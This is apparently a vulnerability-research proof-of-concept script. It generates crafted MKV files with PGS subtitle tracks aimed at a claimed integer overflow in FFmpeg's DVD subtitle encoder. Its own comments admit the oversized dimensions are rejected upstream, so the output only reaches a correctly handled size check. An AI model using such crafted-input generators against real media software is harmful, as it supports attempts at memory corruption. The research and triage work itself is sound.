#!/usr/bin/env python3
"""
PoC generator for VULN-001: Integer Overflow in dvdsubenc.c dvdsub_encode()

The vulnerable check at line 344 of dvdsubenc.c:
    if ((q - outbuf) + vrect.w * vrect.h / 2 + 17 + 21 > outbuf_size)

When vrect.w * vrect.h overflows signed int32 (i.e., w*h > INT_MAX = 2147483647),
the multiplication result becomes negative, causing the bounds check to pass
incorrectly. dvd_encode_rle then writes past the allocated output buffer.

Trigger condition: w=46341, h=46342 gives w*h = 2147534622 > INT_MAX.

LIMITATION NOTE:
The PGS decoder (pgssubdec.c) uses ff_set_dimensions() for PCS video dimensions
and avctx->width < width check for ODS. Because avcodec_open2() and
ff_set_dimensions() both call av_image_check_size2(), dimensions large enough
to cause the dvdsubenc overflow are rejected before reaching the encoder.

Mathematical proof: av_image_check_size2 with AV_PIX_FMT_NONE uses
  stride = 8*w + 1024; constraint: stride*(h+128) < INT_MAX
This limits w*h to approximately INT_MAX/8 ~ 268M, well below the 2.1B needed
for signed overflow. Thus the PoC demonstrates reaching dvdsubenc with the
largest valid dimensions, which triggers BUFFER_TOO_SMALL (not an overflow).

We craft:
  - Attempt 1: w=65535, h=32770 -> exceeds avctx dim check, PGS ODS fails
  - Attempt 2: w=1025, h=2046   -> valid PGS dims, reaches dvdsubenc size check,
                                    triggers "dvd_subtitle too big" correctly
"""

import struct
import os
import sys


# ---------------------------------------------------------------------------
# EBML encoding helpers
# ---------------------------------------------------------------------------

def vint_size(value):
    """Compute VINT size for an EBML element size."""
    if value < 0x7F:
        return 1
    elif value < 0x3FFF:
        return 2
    elif value < 0x1FFFFF:
        return 3
    elif value < 0x0FFFFFFF:
        return 4
    else:
        return 8


def encode_vint(value, width=None):
    """Encode an EBML variable-length integer (size encoding)."""
    if width is None:
        width = vint_size(value)
    if width == 1:
        assert value < 0x80
        return bytes([value | 0x80])
    elif width == 2:
        assert value < 0x4000
        v = value | 0x4000
        return struct.pack('>H', v)
    elif width == 3:
        assert value < 0x200000
        v = value | 0x200000
        return bytes([(v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF])
    elif width == 4:
        assert value < 0x10000000
        v = value | 0x10000000
        return struct.pack('>I', v)
    else:
        # 8-byte VINT with 0x01 prefix
        v = value | 0x0100000000000000
        return struct.pack('>Q', v)


def elem(eid, data):
    """Create an EBML element: ID + size_vint + data."""
    if isinstance(data, int):
        if data == 0:
            data = b'\x00'
        else:
            n = (data.bit_length() + 7) // 8
            data = data.to_bytes(n, 'big')
    elif isinstance(data, str):
        data = data.encode('utf-8')
    data = bytes(data)
    # Encode element ID as raw bytes (already has marker bits embedded)
    n_id = (eid.bit_length() + 7) // 8
    id_bytes = eid.to_bytes(n_id, 'big')
    size_bytes = encode_vint(len(data))
    return id_bytes + size_bytes + data


def master(eid, *children):
    """Create an EBML master element containing child elements."""
    data = b''.join(children)
    n_id = (eid.bit_length() + 7) // 8
    id_bytes = eid.to_bytes(n_id, 'big')
    size_bytes = encode_vint(len(data))
    return id_bytes + size_bytes + data


# ---------------------------------------------------------------------------
# PGS (HDMV PGS) subtitle construction
# In MKV, PGS segments are stored WITHOUT the "PG" sync magic and PTS/DTS.
# Format per segment: type(1B) + length(2B) + data
# ---------------------------------------------------------------------------

def pgs_segment(seg_type, data):
    """Create one PGS segment (as stored in MKV blocks)."""
    return struct.pack('>BH', seg_type, len(data)) + data


def make_pgs_all_transparent_rle(width, height, max_bytes=None):
    """
    Create PGS RLE data for a fully transparent (color=0) image.
    PGS RLE format:
      - 0x00 0xNN: special run
        flags = NN, run = flags & 0x3F
        if flags & 0x40: run = (run<<8) + next_byte  (extended run)
        color = 0 if !(flags & 0x80), else next_byte
        if run == 0: end of line
      - other: run=1, color=byte_value
    Use sequence 0x00 0x7F 0xFF for max run (16383) of color=0 (transparent).
    If max_bytes is set, truncate the RLE (produces invalid/truncated stream).
    """
    total_pixels = width * height
    rle = bytearray()
    remaining = total_pixels
    max_run = 16383  # (0x3F<<8)|0xFF = 16383

    while remaining > 0:
        if max_bytes is not None and len(rle) + 3 > max_bytes:
            break
        run = min(remaining, max_run)
        if run == max_run:
            # 0x00, 0x7F, 0xFF = run of 16383 transparent pixels
            rle += bytes([0x00, 0x7F, 0xFF])
        else:
            # Encode remaining pixels
            run_hi = (run >> 8) & 0x3F
            run_lo = run & 0xFF
            # flags: bit6=1 (extended), bit7=0 (color=0)
            flags = 0x40 | run_hi
            rle += bytes([0x00, flags, run_lo])
        remaining -= run

    return bytes(rle)


def make_pgs_display_set(video_w, video_h, obj_w, obj_h, truncate_rle=False):
    """
    Create a PGS display set for a single transparent subtitle object.
    Returns the raw bytes to embed in an MKV subtitle block.

    The PGS segment length field is uint16 (max 65535 bytes per segment).
    For very large objects, we limit each ODS segment to 65535 bytes.
    If truncate_rle=True, we provide minimal (truncated) RLE data.
    """
    # PCS - Presentation Composition Segment (type 0x16)
    pcs_data = bytearray()
    pcs_data += struct.pack('>H', min(video_w, 0xFFFF))  # video_width
    pcs_data += struct.pack('>H', min(video_h, 0xFFFF))  # video_height
    pcs_data += struct.pack('>B', 0x10)      # frame_rate (24fps placeholder)
    pcs_data += struct.pack('>H', 1)         # composition_number
    pcs_data += struct.pack('>B', 0x80)      # composition_state (epoch start)
    pcs_data += struct.pack('>B', 0x00)      # palette_update_flag
    pcs_data += struct.pack('>B', 0)         # palette_id
    pcs_data += struct.pack('>B', 1)         # number_of_composition_objects
    # Composition object 0
    pcs_data += struct.pack('>H', 0)         # object_id
    pcs_data += struct.pack('>B', 0)         # window_id
    pcs_data += struct.pack('>B', 0x00)      # cropped_flag
    pcs_data += struct.pack('>H', 0)         # obj_horizontal_position
    pcs_data += struct.pack('>H', 0)         # obj_vertical_position

    # WDS - Window Definition Segment (type 0x17)
    wds_data = bytearray()
    wds_data += struct.pack('>B', 1)              # number_of_windows
    wds_data += struct.pack('>B', 0)              # window_id
    wds_data += struct.pack('>H', 0)              # window_horizontal_position
    wds_data += struct.pack('>H', 0)              # window_vertical_position
    wds_data += struct.pack('>H', min(obj_w, 0xFFFF))  # window_width
    wds_data += struct.pack('>H', min(obj_h, 0xFFFF))  # window_height

    # PDS - Palette Definition Segment (type 0x14)
    pds_data = bytearray()
    pds_data += struct.pack('>B', 0)  # palette_id
    pds_data += struct.pack('>B', 0)  # palette_version
    # Entry 0: fully transparent (Y=16, Cr=128, Cb=128, alpha=0=transparent)
    pds_data += bytes([0, 16, 128, 128, 0])   # entry 0: transparent

    # ODS - Object Definition Segment (type 0x15)
    # The PGS segment length field is a uint16, limiting each segment to 65535 bytes.
    # The ODS header before data: obj_id(2) + ver(1) + seq_desc(1) + data_len(3) = 7 bytes
    # Plus width(2) + height(2) = 4 bytes for first segment header.
    # Max RLE per ODS first-segment: 65535 - 7 - 4 = 65524 bytes
    MAX_SEG_DATA = 65535  # uint16 max for PGS segment length

    if truncate_rle:
        # For overflow dimensions: provide minimal truncated RLE just to embed the dimensions.
        # Use a very short RLE sequence (will be invalid/incomplete).
        rle_data = bytes([0x00, 0x7F, 0xFF] * 10)  # 30 bytes of run data
    else:
        # Calculate full RLE for the object (may be large but valid)
        total_pixels = obj_w * obj_h
        # Max RLE data that can fit in ODS segments considering uint16 length limit
        # We use truncation if it would exceed a reasonable size
        max_rle_bytes = min(total_pixels * 3 // 16383 * 3 + 6, MAX_SEG_DATA - 11)
        rle_data = make_pgs_all_transparent_rle(obj_w, obj_h, max_bytes=max_rle_bytes)

    # For the ODS, we need the total object_data_length to include all RLE
    # (even if we're providing truncated data - decode will fail but that's OK)
    total_pixels = obj_w * obj_h
    # Estimate the "claimed" full RLE length for correct object_data_length field
    # Use the actual rle_data length to avoid parser confusion
    obj_data_length = 2 + 2 + len(rle_data)  # width(2) + height(2) + rle

    ods_data = bytearray()
    ods_data += struct.pack('>H', 0)   # object_id
    ods_data += struct.pack('>B', 0)   # version_number
    ods_data += struct.pack('>B', 0xC0)  # sequence_descriptor (first+last)
    # 3-byte big-endian object_data_length
    ods_data += bytes([
        (obj_data_length >> 16) & 0xFF,
        (obj_data_length >> 8) & 0xFF,
        obj_data_length & 0xFF
    ])
    ods_data += struct.pack('>H', obj_w & 0xFFFF)  # width (truncated to 16-bit)
    ods_data += struct.pack('>H', obj_h & 0xFFFF)  # height (truncated to 16-bit)
    ods_data += rle_data

    # If ODS data exceeds uint16, truncate (this produces an invalid segment for large dims)
    if len(ods_data) > MAX_SEG_DATA:
        ods_data = ods_data[:MAX_SEG_DATA]

    # END - End of Display Set (type 0x80)
    end_data = b''

    # Assemble display set (segments concatenated)
    display_set = b''
    display_set += pgs_segment(0x16, bytes(pcs_data))  # PCS
    display_set += pgs_segment(0x17, bytes(wds_data))  # WDS
    display_set += pgs_segment(0x14, bytes(pds_data))  # PDS
    display_set += pgs_segment(0x15, bytes(ods_data))  # ODS
    display_set += pgs_segment(0x80, end_data)          # END

    return display_set


def make_mkv(output_path, obj_w, obj_h, truncate_rle=False):
    """
    Construct a minimal MKV file with a PGS subtitle track.
    The subtitle has object dimensions obj_w x obj_h.
    Video dimensions in PCS are set to obj_w x obj_h (so PCS sets avctx dims).
    """
    # MKV EBML element IDs
    EBML_ID          = 0x1A45DFA3
    EBML_VERSION     = 0x4286
    EBML_READVERSION = 0x42F7
    EBML_MAXIDLEN    = 0x42F2
    EBML_MAXSIZELEN  = 0x42F3
    DOCTYPE          = 0x4282
    DOCTYPEVERSION   = 0x4287
    DOCTYPEREADVER   = 0x4285

    SEGMENT          = 0x18538067
    SEGMENTINFO      = 0x1549A966
    TIMECODESCALE    = 0x2AD7B1
    DURATION         = 0x4489
    MUXINGAPP        = 0x4D80
    WRITINGAPP       = 0x5741

    TRACKS           = 0x1654AE6B
    TRACKENTRY       = 0xAE
    TRACKNUMBER      = 0xD7
    TRACKUID         = 0x73C5
    TRACKTYPE        = 0x83
    FLAGINVISIBLE    = 0xB9
    CODECID          = 0x86

    CLUSTER          = 0x1F43B675
    TIMESTAMP        = 0xE7
    SIMPLEBLOCK      = 0xA3

    # Build the subtitle display set packet
    # For large dimensions that fail av_image_check_size, PCS will set avctx->w/h=0
    # and the ODS check will fail. We try both large and reasonable dimensions.
    subtitle_data = make_pgs_display_set(obj_w, obj_h, obj_w, obj_h, truncate_rle=truncate_rle)

    # EBML Header
    ebml_header = master(
        EBML_ID,
        elem(EBML_VERSION, 1),
        elem(EBML_READVERSION, 1),
        elem(EBML_MAXIDLEN, 4),
        elem(EBML_MAXSIZELEN, 8),
        elem(DOCTYPE, 'matroska'),
        elem(DOCTYPEVERSION, 4),
        elem(DOCTYPEREADVER, 2),
    )

    # Segment Info
    duration_bytes = struct.pack('>d', 5000.0)  # 5 seconds in ms
    seg_info = master(
        SEGMENTINFO,
        elem(TIMECODESCALE, 1000000),  # 1ms per tick
        elem(MUXINGAPP, 'libebml poc'),
        elem(WRITINGAPP, 'vuln_001_gen'),
        elem(DURATION, duration_bytes),
    )

    # Subtitle track (S_HDMV/PGS)
    sub_track = master(
        TRACKENTRY,
        elem(TRACKNUMBER, 1),
        elem(TRACKUID, 1),
        elem(TRACKTYPE, 17),   # 17 = subtitle
        elem(FLAGINVISIBLE, 0),
        elem(CODECID, 'S_HDMV/PGS'),
    )

    tracks = master(TRACKS, sub_track)

    # SimpleBlock: track_num(vint) + timecode(int16) + flags(uint8) + data
    # Track 1 = 0x81 (VINT-encoded), timecode=0, flags=0x80 (keyframe)
    block_header = bytes([0x81]) + struct.pack('>h', 0) + bytes([0x80])
    block_data = block_header + subtitle_data

    # Cluster
    cluster = master(
        CLUSTER,
        elem(TIMESTAMP, 0),
        elem(SIMPLEBLOCK, block_data),
    )

    # Segment content
    seg_content = seg_info + tracks + cluster

    # Segment with computed size
    seg_id_bytes = SEGMENT.to_bytes(4, 'big')
    seg_size_bytes = encode_vint(len(seg_content))
    segment = seg_id_bytes + seg_size_bytes + seg_content

    mkv = ebml_header + segment

    with open(output_path, 'wb') as f:
        f.write(mkv)

    print(f"[+] Generated {output_path} ({len(mkv)} bytes)")
    print(f"[+] Subtitle dimensions: {obj_w} x {obj_h}")
    print(f"[+] w*h = {obj_w * obj_h}")
    print(f"[+] INT_MAX = {2**31 - 1}")
    overflow = (obj_w * obj_h) > (2**31 - 1)
    print(f"[+] w*h overflows signed int32: {overflow}")
    rle_len = len(make_pgs_all_transparent_rle(obj_w, obj_h))
    print(f"[+] RLE data size: {rle_len} bytes")
    print(f"[+] PGS subtitle data size: {len(subtitle_data)} bytes")


if __name__ == '__main__':
    output = 'vuln_001_input.mkv'

    # Primary attempt: dimensions that would cause overflow in dvdsubenc
    # (w*h > INT_MAX). Due to av_image_check_size in pgssubdec ff_set_dimensions,
    # PCS will fail and ODS will be rejected. We document this behavior.
    W_OVERFLOW = 46341
    H_OVERFLOW = 46342

    # Secondary attempt: largest valid PGS dimensions that pass av_image_check_size
    # but still trigger BUFFER_TOO_SMALL in dvdsubenc (confirming the code path).
    # For ff_set_dimensions with AV_PIX_FMT_NONE:
    #   stride = 8*w + 1024; constraint: stride*(h+128) < INT_MAX
    # For w=1025, h=2046: passes av_image_check_size, but dvdsubenc correctly
    # detects buffer overflow: 4 + 1025*2046/2 + 38 = 1048625 > 1048576
    W_VALID = 1025
    H_VALID = 2046

    print("[*] Primary attempt (overflow dimensions - expected: PGS decoder rejects):")
    # Use truncated RLE for the overflow dimensions since full RLE would be 2B+ pixels
    make_mkv('vuln_001_input_overflow.mkv', W_OVERFLOW, H_OVERFLOW, truncate_rle=True)

    print("")
    print("[*] Secondary attempt (valid dimensions - expected: dvdsubenc BUFFER_TOO_SMALL):")
    make_mkv('vuln_001_input_valid.mkv', W_VALID, H_VALID)

    print("")
    print("[*] Using valid dimensions MKV as primary input:")
    import shutil
    shutil.copy('vuln_001_input_valid.mkv', output)
    print(f"[+] Final PoC file: {output}")
